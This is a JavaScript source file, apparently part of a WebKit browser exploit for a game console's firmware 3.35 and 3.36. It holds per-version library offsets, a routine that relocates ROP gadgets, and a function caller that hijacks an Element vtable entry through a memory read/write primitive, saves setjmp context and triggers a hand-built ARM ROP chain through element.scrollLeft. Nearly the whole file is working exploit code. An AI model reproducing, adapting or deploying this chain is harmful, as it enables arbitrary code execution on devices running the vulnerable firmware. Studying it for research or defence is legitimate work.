/*
    ROP planning (Firmware 3.35 and 3.36)
*/

/*
    Version offsets
*/
function defineOffsets()
{
	ver_offsets = {
		v3_35:{
				elementvtable_off: -0x70,
				setscrollleft_idx: 0x4e, // * 4
				scewkbase_off: 0x406955,
				scelibcentry_off: 0x857158,
				scelibcbase_off: 0xf9f5,
				scelibnetentry_off:0x857114,
				scelibnetbase_off:0x22d1,
				scekernentry_off:0x857128,
				scekernbase_off:0x82d9
		},
		v3_36:{
				elementvtable_off: -0x70,
				setscrollleft_idx: 0x4e, // * 4
				scewkbase_off: 0x406999,
				scelibcentry_off: 0x8571b8,
				scelibcbase_off: 0xf9f5,
		}
	}
}

/*
    Gadget initializer
*/
function init_ggts(bases, caller, ver)
{
    var results = version_deps[ver];
    for (b in bases)
	{
        if (bases.hasOwnProperty(b)) 
		{
            func_list = results[b].functions;
            for (fcn in func_list) 
			{
                if (func_list.hasOwnProperty(fcn)) 
				{
                    func_list[fcn] = caller(func_list[fcn] + bases[b], results);
                }
            }
            gadgets = results[b].gadgets;
            for (ggt in gadgets)
			{
                if (gadgets.hasOwnProperty(ggt))
				{
                    gadgets[ggt]= gadgets[ggt] + bases[b];
                }
            } 
        }
    }
    return results;
}

/*
   Function caller
*/
function get_caller(tmpmem, element, vtidx, fkvtable, version)
{
    return function (fcn, libraries)
	{
        return function(r0, r1, r2, r3)
		{
            var allocate_tmp = init_memory(tmpmem);
            var context_size = 0x30;
            var eleobj_size = 0x22;

            var scontext = allocate_tmp(context_size * 4);
            var seleobj = allocate_tmp(eleobj_size * 4);
            var scewkggts = libraries.SceWebKit.gadgets;
            var scelibcggts = libraries.SceLibc.gadgets;

			// Save Element object
            for (var i = 0; i < eleobj_size; i++) {
                aspace32[(seleobj + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

			// Call setjmp
            aspace32[(fkvtable + (0x4e << 2)) / 4] = scelibcggts.scesetjmp;
            element.scrollLeft = 0xdeadbabe;

            // Save jmp context
            for (var i = 0; i < context_size; i++) {
                aspace32[(scontext + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

            // Restore Element object
            for (var i = 0; i < 30; i++) {
                aspace32[(vtidx + (i << 2)) / 4] = aspace32[(seleobj + (i << 2)) / 4];
            }
			
			var retval = allocate_tmp(0x4);

			if ((version == "v3_35")||(version == "v3_36"))
			{
				// ROP chain for FW 3.35 and 3.36
				var r1values = allocate_tmp(0x10 * 4);
				var r4values = allocate_tmp(0x10 * 4);
				var r1values2 = allocate_tmp(0x10 * 4);
				var r4values2 = allocate_tmp(0x10 * 4);
				
				mymemset(retval, 0, 4);

				aspace32[((r1values + 0) / 4)] = r0;                           // r0
				aspace32[((r1values + 4) / 4)] = r1;                           // r1
				aspace32[((r1values + 8) / 4)] = r2;                           // r2
				aspace32[((r1values + 12) / 4)] = r4values;                    // r4
				aspace32[((r1values + 16) / 4)] = 0x0;                         // ip
				aspace32[((r1values + 20) / 4)] = scewkggts.ldmr4_1;           // lr
				aspace32[((r1values + 24) / 4)] = fcn;                         // pc

				aspace32[((r4values + 0) / 4)] = r1values2;                    // r1
				aspace32[((r4values + 4) / 4)] = 0;                            // ip
				aspace32[((r4values + 8) / 4)] = 0;                            // lr
				aspace32[((r4values + 12) / 4)] = scewkggts.ldmr1_3;           // pc

				aspace32[((r1values2 + 0) / 4)] = retval;                      // r1
				aspace32[((r1values2 + 4) / 4)] = r4values2;                   // r4
				aspace32[((r1values2 + 8) / 4)] = 0;                           // ip
				aspace32[((r1values2 + 12) / 4)] = scewkggts.ldmr4_2;          // lr
				aspace32[((r1values2 + 16) / 4)] = scewkggts.strr0;            // pc

				aspace32[((r4values2 + 0) / 4)] = scontext;                    // r0
				aspace32[((r4values2 + 4) / 4)] = 0;                           // ip
				aspace32[((r4values2 + 8) / 4)] = 0;                           // lr
				aspace32[((r4values2 + 12) / 4)] = scelibcggts.scelongjmp;     // pc
				
				var ropchain = [0, r1values, r3, 0, 0, 0, 0, scewkggts.ldmr1_2];
				var rchainaddr = allocate_tmp(ropchain.length * 4);
				
				// Copy ROPchain
				for (var i = 0; i < ropchain.length; i++) {
					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
				}

				// Trigger ROPchain
				aspace32[(fkvtable + (0x4e << 2)) / 4] = scewkggts.ldmr1_1; 
				element.scrollLeft = rchainaddr;
			}
			
            return aspace32[(retval / 4)];
        }
    };
}
